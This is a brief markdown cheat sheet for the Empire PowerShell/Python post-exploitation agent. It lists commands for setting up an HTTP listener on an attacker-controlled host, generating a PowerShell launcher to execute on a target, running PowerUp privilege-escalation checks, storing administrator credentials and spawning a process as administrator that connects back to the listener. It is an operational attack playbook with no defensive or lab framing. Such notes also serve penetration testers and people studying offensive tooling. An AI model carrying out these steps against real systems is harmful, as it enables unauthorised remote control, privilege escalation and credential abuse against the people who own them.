# Empire

> Empire is a PowerShell and Python post-exploitation agent.  
[GitHub - EmpireProject/Empire](https://github.com/EmpireProject/Empire)

## Setup

Reset db
```
setup/reset.sh
```

Setup listener
```
listeners
uselistener http
info
set Host http://<ip>:<port>
set Port <port>
execute
```

## Generate shellcode

```
launcher powershell
```
-> Paste output into file and execute on target

## Interact with agent

```
back
back
interact <agent-id>
searchmodule PowerUp
usemodule privesc/powerup/allcheck
execute
```

Store credentials
```
creds add <DefaultDomainName> administrator <pw>
```

```
usemodule management/spawnas
info
set Domain <DefaultDomainName>
```

```
set UserName administrator
set Password <pw>
```
Or use stored creds
```
set CredID <creds-id>
```

```
set Listener http
execute
```

```
back
back
agents
```
